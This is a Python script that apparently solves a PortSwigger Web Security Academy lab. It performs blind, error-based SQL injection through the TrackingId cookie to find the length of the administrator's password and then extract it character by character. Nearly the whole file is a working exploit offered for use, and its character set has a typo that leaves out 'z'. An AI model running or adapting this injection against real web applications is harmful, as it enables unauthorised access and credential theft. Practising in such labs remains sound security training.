import requests 

url="https://0aa7002703f4815a8038084e00b9004b.web-security-academy.net/login"
cookies= {
	'TrackingId' :"PjhVSJlKSBALXKIp" ,	
	'session' : 'LAxaaMfxcSUG4gYGv5Ogjpx0Smm8sC4Y'
}
headers={
	'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0'
}


def Long(cookies , headers , url):
	ok=True
	i=0
	while ok :
		i+=1
		cookies['TrackingId']="PjhVSJlKSBALXKIp ' AND (SELECT CASE WHEN LENGTH(password) = "+str(i)+" THEN 'ok' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator') ='ok' --   "
		res=requests.get(url , headers=headers , cookies=cookies)	
		if res.status_code == 200 :
			print("[Calculating Finished :)] Length is "+str(i))
			ok=False
		else : print("[Calculating Lenght ...] Length is not  "+str(i) , res.status_code)	
		

#Long(cookies , headers , url)

def Brute(cookies , headers , url) :
	c="abcdefghijklmnopqrstuvwxys0123456789"
	pwd=""	

	for j in range(1,21):
		for i in range(len(c)):
			cookies["TrackingId"]=	"PjhVSJlKSBALXKIp ' AND (SELECT CASE WHEN (SUBSTR(password,"+str(j)+", 1) = '"+c[i]+"') THEN 'ok' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator') ='ok' --   "
			res=requests.get(url , headers=headers , cookies=cookies)	
			print("[Wait for the analyses ...]   ||  "+pwd+c[i])
			if res.status_code == 200 :
				pwd=pwd+c[i]
				break
	print("[analys Finished]  ||  The Password is " +pwd)
		
		
		
		
Brute(cookies , headers , url)

	

